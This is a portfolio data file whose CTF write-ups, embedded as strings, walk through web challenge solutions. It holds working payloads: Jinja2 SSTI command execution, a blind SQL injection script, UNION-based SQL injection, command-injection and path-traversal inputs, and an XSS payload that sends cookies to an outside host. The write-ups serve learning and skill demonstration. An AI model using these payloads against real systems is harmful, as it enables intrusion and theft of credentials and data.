
import { Certification, Experience, CtfEvent } from './types';
export { PROJECTS } from './projectData';

export const CERTIFICATIONS: Certification[] = [
  {
    id: 'cwes',
    name: 'Hack The Box Certified Web Exploitation Specialist (HTB CWES)',
    issuer: 'Hack The Box',
    year: '2026',
    category: 'Cybersecurity',
    featured: true,
    imageUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/CWES.jpg?raw=true',
    description: 'Intermediate credential focusing on web vulnerabilities, black-box testing, and creative exploitation techniques across modern web architectures.',
    credentialUrl: 'https://www.credly.com/badges/2db82c7d-602c-485f-82df-42578c5f6d6a/linked_in_profile'
  },
  {
    id: 'ejpt',
    name: 'eLearnSecurity Junior Penetration Tester (eJPT)',
    issuer: 'eLearnSecurity / INE',
    year: '2021',
    category: 'Cybersecurity',
    imageUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/eJPT.png?raw=true',
    description: 'Entry-level certification demonstrating knowledge in networking, web application security, and penetration testing methodologies.',
    credentialUrl: 'https://certs.ine.com/0670aef5-f76c-4401-9c85-a449d5894749'
  },
  {
    id: 'chfi',
    name: 'Computer Hacking Forensic Investigator (CHFI)',
    issuer: 'EC-Council',
    year: '2023',
    category: 'Cybersecurity',
    imageUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/CHFI.png?raw=true',
    description: 'Validation of advanced forensic skills used to investigate cyberattacks and provide evidence for prosecution.',
    credentialUrl: 'https://www.eccouncil.org/train-certify/computer-hacking-forensic-investigator-chfi/'
  },
  {
    id: 'ics300',
    name: 'Advanced Cybersecurity for Industrial Control Systems (ICS300)',
    issuer: 'CISA',
    year: '2024',
    category: 'OT/ICS',
    imageUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/ICS-300.png?raw=true',
    description: 'Training provided by CISA focusing on the identification and mitigation of cybersecurity threats to critical infrastructure and industrial control systems.',
    credentialUrl: 'https://www.cisa.gov/resources-tools/training/advanced-cybersecurity-industrial-control-systems-ics300'
  },
  {
    id: 'google-vertex',
    name: 'Prompt Engineering in Vertex AI',
    issuer: 'Google Cloud',
    year: '2024',
    category: 'AI & Machine Learning',
    imageUrl: 'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/vertexAI.jpg?raw=true',
    description: 'Google Cloud Skill Badge validating proficiency in designing prompts and managing generative AI models using Vertex AI.',
    credentialUrl: 'https://www.credly.com/badges/1a46db20-5ab3-4266-ade4-4b69551aa933/linked_in_profile'
  }
];

export const EXPERIENCE: Experience[] = [
  {
    id: 'psa-intern',
    title: 'Cybersecurity Intern',
    organization: 'PSA International',
    duration: 'Sep 2024 - Dec 2024',
    bullets: [
      'Managed business units in Middle East and Southeast Asia, ensuring dissemination and compliance with critical security advisories.',
      'Collected and analyzed data from internal phishing simulations to assess user awareness.',
      'Educated business units on Operational Technology (OT) security principles and best practices.',
      'Aggregated monthly security statistics to evaluate adherence to corporate security standards.'
    ]
  },
  {
    id: 'nyp-diploma',
    title: 'Diploma in Cybersecurity & Digital Forensics',
    organization: 'Nanyang Polytechnic',
    duration: '2022 - 2025',
    bullets: [
      'Pursued studies in cybersecurity fundamentals, and digital forensics and obtained a diploma',
    ]
  }
];

export const CTF_EVENTS: CtfEvent[] = [
  {
    id: 'snyk-2024',
    name: 'SNYK FETCH THE FLAG',
    date: '2025',
    summary: 'Solved most of the web challenges.',
    coverImages: [
      'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(32).png?raw=true',
      'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image.png?raw=true'
    ],
    challenges: [
      { 
        id: 'snyk-timeoff', 
        name: 'TimeOff', 
        category: 'Web', 
        difficulty: 'Easy', 
        description: 'Web application challenge involving staff timeoff requests and file upload functionality.', 
        writeup: `![TimeOff Dashboard Overview](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(1).png?raw=true)

This web app is an app for staffs to submit timeoff request. Users can upload files when submiting timeoff request.

![TimeOff Submission Interface](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-02-28%20154324.png?raw=true)

### Analysis: File Upload Logic
The following Ruby code handles the document attachment during the time-off request submission:

\`\`\`ruby
 if params[:doc]
    uploaded_file = params[:doc][:file]
    if uploaded_file
      storage_directory = Rails.root.join("public", "uploads")
      FileUtils.mkdir_p(storage_directory) unless Dir.exist?(storage_directory)
      storage_path = storage_directory.join(uploaded_file.original_filename)

      Rails.logger.info "Saving uploaded file to: #{storage_path}"

      File.open(storage_path, "wb") do |file|
        file.write(uploaded_file.read)
      end

      doc = Document.new(
        name: params[:doc][:file_name],
        file_path: uploaded_file.original_filename
      )
      doc.time_off_request = @time_off_request
      doc.save
    end
  end
\`\`\`

### Analysis: File Download Logic
The download function retrieves the file using a path constructed from the document name:

\`\`\`ruby
def download
    @document = Document.find(params[:id])
    base_directory = Rails.root.join("public", "uploads")
    path_to_file = File.join(base_directory, @document.name)

    if File.exist?(path_to_file)
        send_file path_to_file,
                filename: @document.file_path.presence || "document",
                type: "application/octet-stream"
    else
        redirect_back(fallback_location: root_path)
    end
end
\`\`\`

### The Vulnerability
The code shows that the file is saved using the **original file name** which is the file name of the uploaded file. However, the download function fetches the file using the **document name**—which is a separate string supplied by the user in the form.

![Vulnerable Form Fields](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-02-28%20154410.png?raw=true)

### Exploitation
Uploading any text file and setting the document name to \`../../flag.txt\` allows for a **Path Traversal** attack when downloading the file later.

1. The file is actually saved at \`/uploads/your_file.txt\`.
2. The system attempts to download \`/uploads/../../flag.txt\`.
3. The application traverses outside the intended directory and reads the root-level flag.

![Flag Retrieval Success](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-02-28%20154428.png?raw=true)

Hence, downloading the txt file allows me to obtain the flag from the server filesystem.`
      },
      { 
        id: 'snyk-unfurl', 
        name: 'Unfurl', 
        category: 'Web', 
        difficulty: 'Easy', 
        description: 'SSRF with command injection', 
        writeup: `### Challenge Overview

![Unfurl Dashboard](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(30).png?raw=true)

This web challenge has a function where a user can input a URL and the web server will make request to that URL and retrieve the raw HTML.

![Function Interface](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-02-28%20212527.png?raw=true)

### Vulnerability Analysis

Looking at the code, there is a admin panel hosted on localhost with random port from 1024 to 2500.

\`\`\`javascript
adminApp.use('/', adminRoutes);

// This should keep people away from the admin panel!
function getRandomPort() {
    const MIN_PORT = 1024;
    const MAX_PORT = 2500;
    let port;
    do {
        port = Math.floor(Math.random() * (MAX_PORT - MIN_PORT + 1)) + MIN_PORT;
    } while (port === 5000);
    return port;
}

const adminPort = getRandomPort();
adminPort.listen(adminPort, '127.0.0.1', () => {
    console.log(\`[INFO] Admin app running on http://127.0.0.1:\${adminPort}\`);
});
\`\`\`

I can use the function above and make request to localhost and brute force the port number.

![Port Brute Forcing](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-02-28%20213818%20(2).png?raw=true)

Since the web server is sending the request and send the raw HTML back to me, I can get access to the admin panel.

![Admin Access](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-02-28%20213850.png?raw=true)

### Flag Retrieval

After identifying the port number, I can get the raw HTML of the admin panel. In the admin panel, there is a page for admin to execute linux command.

As such, I can use payload like **http://127.0.0.1:1232/execute?cmd=cat flag.txt** to obtain the flag.

![Flag Discovery](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-02-28%20213924.png?raw=true)` 
      },
      { 
        id: 'snyk-plantly', 
        name: 'Plantly', 
        category: 'Web', 
        difficulty: 'Medium', 
        description: 'SSTI', 
        writeup: `### Challenge Overview

![Plantly Storefront](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(31).png?raw=true)

This web challenge consist of a plant shop and users can make custom requests.

![Custom Request Interface](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-02-28%20215519%20(3).png?raw=true)

### Vulnerability Analysis

Looking at the code, the name of the custom order is appended directly to dynamically generated receipt.

\`\`\`python
   custom_requests = "".join(
        f"<li>Custom Request: {render_template_string(purchase.custom_request)}</li>" for purchase in purchases if purchase.custom_request
    )

    time_of_purchase = datetime.now()
    template = f"""
    <h2>Plantly Receipt</h2>
    <p><strong>Order Date:</strong> { time_of_purchase }</p>
    <hr>
    <h3>Items Purchased</h3>
    <ul>
        {item_list}
    </ul>
    {custom_requests}
    <hr>
    <p><strong>Subtotal:</strong> \\\${\"{:.2f}\".format(subtotal)}</p>
    <p><strong>Tax (10%):</strong> \\\${\"{:.2f}\".format(tax)}</p>
    <p><strong>Total:</strong> \\\${\"{:.2f}\".format(total)}</p>
    <hr>
    <p>Thank you for your purchase!</p>
    """

    try:
        return render_template_string(template)
    except Exception as e:
        flash(f"An error occurred: {str(e)}", "danger")
        return render_template_string(f"<p>Receipt could not be processed: {str(e)}</p>")
\`\`\`

### Exploitation & Flag Retrieval

Using the following payload, I can obtain the flag from the server filesystem:

\`\`\`bash
</li>{{ config.__class__.from_envvar.__globals__.import_string('os').popen('cat flag.txt').read() }}<li>
\`\`\`

![Payload Execution](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-02-28%20215527.png?raw=true)

![Flag Discovery Result](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-02-28%20215542.png?raw=true)`
      },
      { 
        id: 'snyk-weblog', 
        name: 'Weblog', 
        category: 'Web', 
        difficulty: 'Medium', 
        description: 'Web challenge involving a blog post search function vulnerable to SQL Injection and Command Injection.', 
        writeup: `### Challenge Overview

![Weblog Dashboard](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(28).png?raw=true)

This web challenge has a blog post and a search function. The search function directly appends the search query into the sql query hence making it vulnerable to sql injection.

\`\`\`python
 posts = []
    if query:
        try:
            raw_query = text(
                f"SELECT * FROM blog_posts WHERE title LIKE '%{query}%'")
            current_app.logger.info(f"Executing Raw Query: {raw_query}")
            posts = db.session.execute(raw_query).fetchall()
            current_app.logger.info(f"Query Results: {posts}")
\`\`\`

Also, looking at the files, I can tell that the password is saved as MD5 hash in the db.

\`\`\`sql
-- Insert users and blog posts
INSERT IGNORE INTO users (username, password, email, role)
VALUES 
('admin', MD5('admin_password'), 'admin@example.com', 'admin'),
('user1', MD5('user_password'), 'user1@example.com', 'user');
\`\`\`

### Exploitation: Blind SQL Injection

Using the search function, I can perform blind sql injection to figure out the MD5 admin password hash.

![SQLi Testing](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-02-28%20152135.png?raw=true)

This is the python exploit script used to obtain the MD5 hash of the admin password:

\`\`\`python
import requests
import string

characters = string.ascii_lowercase + string.digits + "abcdef"
url = 'http://challenge.ctf.games:32262/search'

pass_length = 32 
password = ["_"] * pass_length
missing_positions = [] 

cookies = {
    "session": ".eJyrVirKz0lVslIqLU4tUtIBU_GZKUpWJhB2XmIuSDaxOEWpFgBHCg57.Z8Fh3g.CP3npLHg5qH9lbpcaLpz4tjbug0"
}

print("[*] Starting Blind SQL Injection...")

for i in range(pass_length):
    found = False
    for a in characters:
        payload = f"%' AND (SELECT substr(password,{i+1},1) FROM users WHERE username = 'admin') = '{a}' -- -"
        
        params = {"q": payload}
        r = requests.get(url, params=params, cookies=cookies)

        print(f"[*] Testing position {i+1}: {a}")

        if 'Welcome to the Blog' in r.text:
            print(f"[+] Character found at position {i+1}: {a}")
            password[i] = a
            found = True
            break

    if not found:
        print(f"No character found at position {i+1}, saving for retry.")
        missing_positions.append(i)

admin_password = "".join(password)
print(f"Admin password: {admin_password}")
\`\`\`

![Script Output](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-02-28%20151948.png?raw=true)

The MD5 hash of the admin password is **c1b8b03c5a1b6d4dcec9a852f85cac59**.

Using an online MD5 hash cracking tool, I can find out the admin password which is **no1trust**.

![Hash Cracking Result](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-02-28%20150312%20(2).png?raw=true)

### Admin Panel & Command Injection

When I login to the admin account, there is a admin panel and there is a function for admin to execute a code. However there was a filter on some special characters to prevent command injection.

\`\`\`python
DEFAULT_COMMAND = "echo 'Rebuilding database...' && /entrypoint.sh"

DISALLOWED_CHARS = r"[&|><$\\\\]"
\`\`\`

However, one special character was still allowed which could allow the attacker to break out of the default command which is semicolon (**;**).

I can exploit command injection and obtain the flag by adding \`; cat flag.txt\` behind the default command.

![Flag Discovery](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-02-28%20150258.png?raw=true)`
      },
      { 
        id: 'snyk-vulnscanner', 
        name: 'Vulnscanner', 
        category: 'Web', 
        difficulty: 'Medium', 
        description: 'Exploiting the scanner itself via YAML configuration bypass.', 
        writeup: `### Challenge Overview

![Vulnscanner Interface](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-02-28%20212209.png?raw=true)

This web challenge has a function for me to upload a yaml template and let the vuln scanner run and return the result. 

![Upload Dashboard](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-02-28%20214256%20(2).png?raw=true)

There is a serverside cryptographic function to generate a hash of the yaml config file and determine the integrity of the file ensuring only the safe example template they provided can be accepted.

However, there is a logic error with the hash check and as long as the hash generated matches the hash in the yaml config file, it will accept the config file. The config file can have a **code** section where the server will execute the code server side and return the result.

![Vulnerable Logic Analysis](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-02-28%20214318%20(2).png?raw=true)

### Exploitation strategy

To generate the valid hash which the server will accept, I set up a local instance of the web challenge and made the server log the generated hash value for the modified config file that I want to upload.

![Local Hash Generation](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-02-28%20214625.png?raw=true)

### Malicious YAML Configuration

Using the recovered hash, I crafted the following payload to execute system commands:

\`\`\`yaml
name: Basic HTTP Check
description: A template to check for HTTP responses.
type: http
requests:
  - method: GET
    path:
      - "/"
    matchers:
      - type: status
        status:
          - 200
code: cat flag.txt
# digest: a72b7d66e46bb8127d874841dc0a7eae294df47e64460fbe8114fab522f0d7aa
\`\`\`

### Result

Upload the above yaml config file and the server will accept it without problem. When the code gets executed server side, I can get the flag.

![Flag Retrieval Result](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/Screenshot%202025-02-28%20214703.png?raw=true)` 
      },
    ]
  },
  {
    id: 'grey-ctf-2024',
    name: 'Grey Cat The Flag (NUS) 2024',
    date: '2024',
    summary: 'Solved multiple web and crypto challenges. Successfully exploited XSS in a custom markdown parser.',
    coverImages: [
      'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(2).png?raw=true'
    ],
    challenges: [
      { 
        id: 'grey-babyweb', 
        name: 'Baby Web', 
        category: 'Web', 
        difficulty: 'Easy', 
        description: 'Introduction to web exploitation involving cookie manipulation.', 
        writeup: `### Challenge Overview

The Flask website code was provided with the secret key and there was an admin page that checks for a cookie \`is_admin=true\`. 

### Exploitation

1. Ran the application locally to analyze behavior.
2. Modified the session cookie to set \`is_admin=True\`.
3. Accessed the admin panel directly.
4. Located the hidden button within the admin interface to reveal the flag.

This was a fundamental web challenge focusing on client-side session control bypass.` 
      },
      { 
        id: 'grey-markdown', 
        name: 'Markdown Parser', 
        category: 'Web', 
        difficulty: 'Easy', 
        description: 'Flaws in markdown rendering logic leading to XSS.', 
        writeup: `# Markdown parser

The provided source code for the markdown parser showed a custom implementation for converting Markdown text to HTML.

\`\`\`javascript
function parseMarkdown(markdownText) {
    const lines = markdownText.split('\\n');
    let htmlOutput = "";
    let inCodeBlock = false;

    lines.forEach(line => {
        if (inCodeBlock) {
            if (line.startsWith('\` \` \`')) {
                inCodeBlock = false;
                htmlOutput += '</code></pre>';
            } else {
                htmlOutput += escapeHtml(line) + '\\n';
            }
        } else {
            if (line.startsWith('\` \` \`')) {
                language = line.substring(3).trim();
                inCodeBlock = true;
                htmlOutput += '<pre><code class="language-' + language + '">';
            } else {
                line = escapeHtml(line);
                line = line.replace(/\\\`(.*?)\\\`/g, '<code>$1</code>');
                line = line.replace(/^(######\\\\s)(.*)/, '<h6>$2</h6>');
                line = line.replace(/^(#####\\\\s)(.*)/, '<h5>$2</h5>');
                line = line.replace(/^(####\\\\s)(.*)/, '<h4>$2</h4>');
                line = line.replace(/^(###\\\\s)(.*)/, '<h3>$2</h3>');
                line = line.replace(/^(##\\\\s)(.*)/, '<h2>$2</h2>');
                line = line.replace(/^(#\\\\s)(.*)/, '<h1>$2</h1>');
                line = line.replace(/\\\\*\\\\*(.*?)\\\\*\\\\*/g, '<strong>$1</strong>');
                line = line.replace(/__(.*?)__/g, '<strong>$1</strong>');
                line = line.replace(/\\\\*(.*?)\\\\*/g, '<em>$1</em>');
                line = line.replace(/_(.*?)_/g, '<em>$1</em>');
                htmlOutput += line;
            }
        }
    });

    return htmlOutput;
}
// ...
\`\`\`

**Code for markdown parser**

If the line starts with \`three backticks\` any characters on the same line won't be sanitized using the \`escapeHTML\` function. Therefore causing XSS.

### Payload:

\`\`\`\`
\`\`\`Asasd"><script>window.open('https://sbahxim.request.dreamhack.games?param2=' + document.cookie, '_blank');</script>
\`\`\`\`
` 
      },
      { 
        id: 'grey-survey', 
        name: 'Greyctf Survey', 
        category: 'Web', 
        difficulty: 'Easy', 
        description: 'Bypass logic in a voting survey by exploiting parseInt quirks.', 
        writeup: `### Challenge Overview

It's a voting page where user can vote within -1 and 1. To get the flag, the score needs to be above 1. But the score is -0.42069. And the votes gets passed through \`parseInt\` function so any vote will be round up to 0.

### Analysis

The backend code for handling votes is as follows:

\`\`\`javascript
app.post('/vote', async (req, res) => {
    const {vote} = req.body;
    if(typeof vote != 'number') {
        return res.status(400).json({
            "error": true,
            "msg":"Vote must be a number"
        });
    }
    if(vote < 1 && vote > -1) {
        score += parseInt(vote);
        if(score > 1) {
            score = -0.42069;
            return res.status(200).json({
                "error": false,
                "msg": config.flag,
            });
        }
        return res.status(200).json({
            "error": false,
            "data": score,
            "msg": "Vote submitted successfully"
        });
    } else {
        return res.status(400).json({
            "error": true,
            "msg":"Invalid vote"
        });
    }
})
\`\`\`

### Exploitation

However, \`parseInt\` function is bad at handling small values with multiple decimal points. The vulnerability arises from how \`parseInt\` handles scientific notation. In JavaScript, very small floating-point numbers are automatically converted to strings in scientific notation (e.g., \`2e-8\`). 

Hence, if i enter \`0.00000002\` as a vote value, JavaScript interprets it as \`2e-8\`. When \`parseInt\` processes this, it reads the leading digit '2' and stops at the 'e', effectively returning the integer \`2\`. This allows me to meet the threshold and get the flag.` 
      },
    ]
  },
  {
    id: 'tenable-2023',
    name: 'Tenable CTF 2023',
    date: '2023',
    coverImages: [
      'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(19).png?raw=true',
      'https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(20).png?raw=true'
    ],
    challenges: [
      {
        id: 'tenable-catviewer',
        name: 'Cat Viewer',
        category: 'Web',
        difficulty: 'Medium',
        description: 'Search through cat photos. A little something extra is hidden in the database.',
        writeup: `So, this is a webpage which retrieve information about cat from their DB using the cat parameter and there is a flag hidden inside the DB

\`https://nessus-catviewer.chals.io/index.php?cat=<name of the cat>\`

To begin with, I tried the simplest method of checking for SQLi which is to insert \`'\` or \`"\`

Inserting \`'\` never returned any error. However, when I tried \`"\` it returned me a SQL error which shows that there is a presence of SQLi

![SQL error](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(4).png?raw=true)

Now, by looking at the error I can tell that they are using SQLite. This info will be used later for getting DB contents.

Since flag is hidden in the DB you need to find a way to select and display it on the page.

You can use \`UNION SELECT\` for this. What it does is, it basically allows to have multiple select in one single statement

\`https://nessus-catviewer.chals.io/index.php?cat=" UNION SELECT NULL--%20-\` 

Above is the SQL statement I tried and it will result in this error

![UNION SELECT ERROR](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(5).png?raw=true)

UNION SELECT requires same number of columns for both left and right. One method to find out number of columns is to add NULL 1 at a time until I don't get an error

After repeating the above step I discovered that I need to have 4 columns for UNION SELECT

Next, I need to find the column which is displayed as cat name. You can find out by adding strings on each column one by one.  

\`https://nessus-catviewer.chals.io/index.php?cat=" UNION SELECT NULL, NULL, 'hello', NULL--%20-\`  

From the above steps I discovered that the third column is being used as cat name

Next, I went on to find out the table names. This can be done using this SQL statement;

\`\`\`sql
" UNION SELECT NULL, NULL, name, NULL FROM sqlite_schema WHERE type='table'-- -
\`\`\`

![table name](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(6).png?raw=true)

Next I listed the column names

\`\`\`
" UNION SELECT NULL, NULL, name, NULL FROM PRAGMA_TABLE_INFO('cats')-- -
\`\`\`

![column name](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(7).png?raw=true)

So, there is a flag column. Now all I need to do is to select it from cats table.

\`\`\`sql
" UNION SELECT NULL, NULL, flag, NULL FROM cats-- -
\`\`\`

![flag](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(8).png?raw=true)`
      },
      { 
        id: 'tenable-rose', 
        name: 'Rose', 
        category: 'Web', 
        difficulty: 'Medium', 
        description: 'The owner of the site shut down sign ups for some reason, but we\'ve got a backup of the code. See if you can get access and get /home/ctf/flag.txt', 
        writeup: `
I have a full working code at the end of the page to get the flag

Code given for this challange:

\`\`\`python
from flask import Flask
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager 

# init SQLAlchemy so we can use it later in our models
db = SQLAlchemy()


app = Flask(__name__)

app.config['SECRET_KEY'] = 'SuperDuperSecureSecretKey1234!'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.sqlite'

db.init_app(app)

login_manager = LoginManager()
login_manager.init_app(app)

from models import User
with app.app_context():
    db.create_all()

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

import main as main_blueprint
app.register_blueprint(main_blueprint
\`\`\`

\`\`\`python
@main.route('/')
def index():
    if("name" in session.keys()):
        return redirect(url_for('main.dashboard'))
    return render_template('index.html')

.
.
.

@main.route('/dashboard')
@login_required
def dashboard():
    template = '''
{% extends "base.html" %} {% block content %}
<h1 class="title">
    Welcome, '''+ session["name"] +'''!
</h1>
<p> The dashboard feature is currently under construction! </p>
{% endblock %}
'''
    return render_template_string(template)
    

from flask_login import UserMixin
from . import db

class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    name = db.Column(db.String(1000))
\`\`\`

\`\`\`python
from flask_login import UserMixin
from . import db

class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    name = db.Column(db.String(1000))
\`\`\`

From the code given, the first thing to take note is the secret key. By knowing the secret key I can forge the session cookie which is used for authentication.

Next when I look at index page, It checks if there is 'name' in session. So what I can do is, I can use the secret key and add session['name'] myself. Copy the session cookie generated and paste it in the challenge page. When I navigate to /dashboard,  I will be stuck in infinite loop where I am redirected to index due to '@login required' and index page will redirect me to dashboard as 'name' is in the session.

When I look at the __Init__ page there is a '@login_manager.user_loader' which takes user_id from session cookie and checks if the user exists. So when I am are creating a session cookie, Apart from adding session['name'] I should also create a User class and login using the \`login_user()\` function.

If everything is done properly, I can enter the dashboard

![dashboard when session['name']='rose'](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(9).png?raw=true)

Next, according to the description I need too access /home/ctf/flag.txt to get the flag. But from the dashboard itself, there isn't anything to interact with to get the flag.

When I try navigating to the path /home/ctf/flag.txt I get an 404 error. So, I assume that /home/ctf/flag.txt is not accessible through client side actions. Which means, I need to use OS command to retrieve the flag.

When I analyze the dashboard code properly, I noticed that session['name'] is added directly without any validation. Maybe this can be an injection point

I moved on to try XSS to check that injection actually works

![XSS alert; session['name']=<script>alert('xss')</script>](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(10).png?raw=true)

I got an alert proving that injection is possible.

Now there is multiple things I can inject; Jinja template, HTML, Javascript

After much research I realised I could perform Jinja2 Server Side Template Injection. I could use SSTI to import OS and read flag.txt. This is the payload used:

\`\`\`python
{{ config.__class__.from_envvar.__globals__.import_string('os').popen('cat flag.txt').read() }}
\`\`\`

When this is rendered on the dashboard page, you can get the flag

![flag](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(11).png?raw=true)

Full Working Code:

\`\`\`python
from flask import Flask, session, render_template_string
from flask_login import LoginManager, UserMixin, login_user

app = Flask(__name__)

app.config['SECRET_KEY'] = 'SuperDuperSecureSecretKey1234!'

login_manager = LoginManager()
login_manager.init_app(app)

class User(UserMixin):
    def __init__(self, user_id):
        self.id = user_id

@login_manager.user_loader
def load_user(user_id):
    return User(user_id)

@app.route('/')
def index():
    user = User(1)
    login_user(user)
    name = "{{ config.__class__.from_envvar.__globals__.import_string('os').popen('cat flag.txt').read() }}"
    session['name'] = name
    return ''

if __name__ == '__main__':
    app.run(debug=True)
\`\`\`` 
      },
    ]
  },
  {
    id: 'rumble-2023',
    name: 'Cyber Security Rumble CTF 2023',
    date: '2023',
    challenges: [
      { 
        id: 'rumble-internskripting', 
        name: 'Internskripting', 
        category: 'Web', 
        difficulty: 'Easy', 
        description: '', 
        writeup: `
This is a web challenge where, if I enter the secret, it will return a flag

![](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(18).png?raw=true)

To begin with, when I checked out the backend code, it had an endpoint /flag which retrieves values from the request header and perform some checks to return a flag.

\`\`\`python
def represents_int(s, default):
    try: 
        app.logger.info("int %s", s)
        return int(s, 0)
    except:
        return default


@app.route("/flag")
def get_flag():
    coffee_secret = request.headers.get('X-Coffee-Secret')
    coffee_disallow = request.headers.get('X-Coffee-Disallow', None)
    coffee_debug = request.headers.get('X-Coffee-Debug', None)
    app.logger.info(request.headers)
    app.logger.info("header contents %s %s %s", coffee_secret, coffee_disallow, coffee_debug)
    app.logger.info("int %d", represents_int(coffee_disallow, 1))
    if represents_int(coffee_disallow, 1) != 0 :
        return json.dumps({"value": "Filthy coffee thief detected!", "code": 418}), 418
    app.logger.info("Gave coffee flag to someone with the secret %s", coffee_secret)
    return json.dumps({"value": flag, "code": 200}), 200
\`\`\`

So the code checks if the value of represents_int(coffee_disallow, 1) != 0 and return "Filthy coffee thief detected!" else, the flag. Basically, the value of X-Coffee-Disallow should be 0 for flag to be returned.

Next, I went to check out the nginx config file.

\`\`\`
location /api {
                proxy_pass http://theapi/;
                
                set $disa 0;
                set $debug_api 0;

                if ($http_x_coffee_secret = 0){
                        return 418;
                }

                if ($http_x_coffee_secret != \${COFFEE_SECRET}) {
                        set $disa 1;
                }

                if ($cookie_debug ~* debUg) {
                        set $disa $http_x_coffee_secret;
                        set $debug_api $cookie_debug;
                }

                proxy_pass_header X-Coffee-Secret;
                proxy_pass_header X-Coffee-Disallow;
                proxy_set_header X-Coffee-Disallow $disa;
                proxy_set_header X-Coffee-Debug $debug_api;
\`\`\`

So, there was a reverse proxy set up when calling the api. What it does is, when the request is made, it checks if x-coffee-secret is 0 and return 418. 

Next, it checks if secret I entered matches the actual secret. If not $disa will be set to 1. $disa will be the value of X-Coffee-Disallow. Hence, $disa should be set to 0. 

The last if checks if the debug cookie matches the case insensitive regex debUg. Note the U in deb'U'g is a unicode. If the condition meets, it will set $disa to secret given by me. This seems like a place where i can control the value of $disa. The only problem is that if I set the X-Coffee-Secret to 0, it will return 418. Hence, I need to find a way to bypass this.

The way to bypass this check is to use hex. 0x0

For the cookie, I can set debug = debÕ½g to match the regex.

Cookie was obtained like this:

\`python3 -c 'print("deb\\u057dg".encode().decode("unicode-escape"))'\`

Now, if you intercept the request and modify accordingly, you can get the flag.

![](https://github.com/kimchanyeop/Portfolio-assets/blob/main/assets/image%20(12).png?raw=true)` 
      },
    ]
  }
];
